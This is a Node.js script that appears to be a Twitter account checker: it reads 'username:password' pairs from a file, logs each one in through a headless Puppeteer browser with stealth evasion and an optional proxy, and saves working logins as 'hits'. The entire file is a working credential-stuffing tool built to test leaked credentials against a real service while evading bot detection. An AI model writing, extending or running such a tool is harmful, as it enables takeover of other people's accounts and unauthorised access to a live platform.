// super fast browser - like it :)
require('dotenv').config()
const puppeteer = require('puppeteer-extra')
const {executablePath} = require('puppeteer')
const fs        = require('fs')
const readline  = require('readline');

// add stealth plugin and use defaults (all evasion techniques)
const StealthPlugin = require('puppeteer-extra-plugin-stealth')
puppeteer.use(StealthPlugin());

const {delay}        = require('./services/helpers')
const USE_PROXY      = process.env.USE_PROXY
const TWT_LOGIN      = process.env.TWT_LOGIN
const TWT_HOME       = process.env.TWT_HOME
const TWT_CHALLENGE  = process.env.TWT_CHALLENGE
const USR_TAG        = process.env.USR_TAG
const NEXT_TAG       = process.env.NEXT_TAG
const PSW_TAG        = process.env.PSW_TAG
const LGN_TAG        = process.env.LGN_TAG
const IN_FILE        = process.env.IN_FILE
const OUT_FILE       = process.env.OUT_FILE
const FAIL_FILE      = process.env.FAIL_FILE;

// Run async process
(async () => {
    // Process lines
    const fileStream = fs.createReadStream(IN_FILE);

    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });

    let lap = 0
    for await (const line of rl) {
        const start = new Date();

        let usr = {
            userName: '',
            password: ''
        }
        let spl = line.split(':')

        usr.userName = spl[0]
        usr.password = spl[1]

        // open our lovely browser
        const browser = await puppeteer.launch({
            headless: true,
            slowMo: 250,
            args: [USE_PROXY ? `--proxy-server=${USE_PROXY}` : ''],
            executablePath: executablePath()
        });
        
        const page = await browser.newPage();
        // open twitter
        await page.goto(TWT_LOGIN, {waitUntil: 'networkidle2'})
        await delay(500)
        // Focus and fast send characters - username
        await page.focus(USR_TAG)
        await page.keyboard.sendCharacter(usr.userName)
        // Next step of flow
        await page.click(NEXT_TAG)
        // Focus and fast send characters - password
        await page.focus(PSW_TAG)
        await page.keyboard.sendCharacter(usr.password)
        await delay(500)
        // Login action
        await page.click(LGN_TAG)
        await delay(5000)
        // Check url if it's OK or not
        const url = await page.evaluate(() => document.location.href);
        // Success
        if(url == TWT_HOME || url == TWT_CHALLENGE){
            // Save hit
            fs.appendFileSync(OUT_FILE, `${line}\n`);
        } else if (url == TWT_LOGIN){
            // Fail accounts
            fs.appendFileSync(FAIL_FILE, `${line}\n`);
        }
        // To-Do add verified accounts check
        console.log("url type :: ", url)
        // Close browser - we do not waste our ram
        await browser.close();
        // Each line in input.txt will be successively available here as `line`.

        const end = new Date()
        lap++
        console.log(`Lap ${lap} :: time estimated finish ${end - start} ms`)
    }
})();